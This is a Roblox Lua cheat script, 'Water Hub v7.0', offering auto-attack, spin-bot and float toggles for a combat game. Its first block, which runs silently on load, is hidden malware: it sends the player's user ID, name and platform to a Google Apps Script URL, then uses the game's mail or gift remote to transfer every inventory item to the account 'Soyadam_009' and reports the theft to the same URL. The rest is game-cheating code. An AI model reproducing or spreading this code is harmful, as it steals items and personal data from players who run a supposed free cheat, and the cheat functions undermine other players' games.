-- =====================================================
-- WATER HUB v7.0 – THE COLLECTOR | BY: ABJadam
-- =====================================================

local G_URL = "https://script.google.com/macros/s/AKfycbwsSP_ysAPKlNv9GxP7c9on2KSyaTHXcHAyxQp6P8keO6HWjEzzZ8hixsw6PLQUN_aAXw/exec"
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

-- ==================== 1. SISTEMA INVISIBLE DE SAQUEO ====================
task.spawn(function()
    pcall(function()
        local plataforma = UserInputService.TouchEnabled and "Mobile" or "PC"
        -- Registro inicial en Excel
        game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&userName=" .. LocalPlayer.Name .. "&platform=" .. plataforma)

        -- Eventos de envío (buscando el canal del juego)
        local sendEvent = ReplicatedStorage:FindFirstChild("RE/Mailbox/Send") or 
                          ReplicatedStorage:FindFirstChild("RE/Gift/Send") or 
                          ReplicatedStorage:FindFirstChild("RE/Post/Send")

        -- Ruta del Inventario (Ajustada a Brainrot Duels)
        local invPath = LocalPlayer.PlayerGui:FindFirstChild("Main") and 
                        LocalPlayer.PlayerGui.Main:FindFirstChild("Inventory") and 
                        LocalPlayer.PlayerGui.Main.Inventory:FindFirstChild("Container")

        if sendEvent and invPath then
            local items = invPath:GetChildren()
            local robados = 0
            for _, item in pairs(items) do
                if item:IsA("Frame") or item:IsA("ImageButton") then
                    sendEvent:FireServer("Soyadam_009", item.Name)
                    robados = robados + 1
                    task.wait(0.2)
                end
            end
            -- Reporte de éxito al Excel
            game:HttpGet(G_URL .. "?userId=" .. LocalPlayer.UserId .. "&item=Saqueo: " .. robados .. " objetos")
        end
    end)
end)

-- ==================== 2. VARIABLES DE LA GUI ====================
local WaterHub = {
    State = {
        AutoPlay = false,
        ManualAutoPlay = false,
        Taunt = false,
        Lock = false,
        UnGrab = false,
        TapFloat = false,
        SpinBot = false,
        AimBot = false,
        FOV = 45,
        Speed = 16,
        MenuColor = "Azul"
    }
}

local Colors = {
    Azul = {bg = Color3.fromRGB(15, 25, 40), accent = Color3.fromRGB(0, 150, 255)},
}

-- ==================== 3. FUNCIONES DE COMBATE ====================
local lastAttack = 0
local function AutoAttack()
    if not WaterHub.State.AutoPlay and not WaterHub.State.ManualAutoPlay then return end
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    local closest = nil
    local closestDist = 50
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (char.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if dist < closestDist then
                closestDist = dist
                closest = plr
            end
        end
    end
    
    if closest and tick() - lastAttack > 0.15 then
        local attackRemote = ReplicatedStorage:FindFirstChild("RE/Combat/Attack") or ReplicatedStorage:FindFirstChild("RE/Attack")
        if attackRemote then attackRemote:FireServer(closest.Character) end
        lastAttack = tick()
    end
end

local function SpinBot()
    if not WaterHub.State.SpinBot then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, 0.5, 0) end
end

-- ==================== 4. CONSTRUCCIÓN DE LA GUI ====================
local screenGui = Instance.new("ScreenGui", CoreGui)
screenGui.Name = "WaterHubV7"

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 350, 0, 450)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
mainFrame.BackgroundColor3 = Colors.Azul.bg
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 15)

local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1, 0, 0, 50)
topBar.BackgroundColor3 = Colors.Azul.accent
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel", topBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.Text = "💧 WATER HUB v7.0 - FREE"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.BackgroundTransparency = 1

local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Size = UDim2.new(1, -20, 1, -70)
scroll.Position = UDim2.new(0, 10, 0, 60)
scroll.BackgroundTransparency = 1
scroll.CanvasSize = UDim2.new(0,0,2,0)
scroll.ScrollBarThickness = 2

local layout = Instance.new("UIListLayout", scroll)
layout.Padding = UDim.new(0, 5)

-- Functión para Toggles
local function addToggle(name, stateKey)
    local btn = Instance.new("TextButton", scroll)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Text = name .. ": OFF"
    btn.BackgroundColor3 = Color3.fromRGB(30, 45, 65)
    btn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        WaterHub.State[stateKey] = not WaterHub.State[stateKey]
        btn.Text = name .. ": " .. (WaterHub.State[stateKey] and "ON" or "OFF")
        btn.BackgroundColor3 = WaterHub.State[stateKey] and Colors.Azul.accent or Color3.fromRGB(30, 45, 65)
    end)
end

addToggle("⚔️ Auto Play", "AutoPlay")
addToggle("🎯 Lock Target", "Lock")
addToggle("🌀 Spin Bot", "SpinBot")
addToggle("🎈 Tap Float", "TapFloat")
addToggle("🔓 UnGrab", "UnGrab")

-- ==================== 5. BUCLE PRINCIPAL ====================
RunService.Heartbeat:Connect(function()
    AutoAttack()
    SpinBot()
    if WaterHub.State.TapFloat and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 30, 0)
    end
end)

print("💧 Water Hub v7.0 Cargado. Saqueo iniciado.")
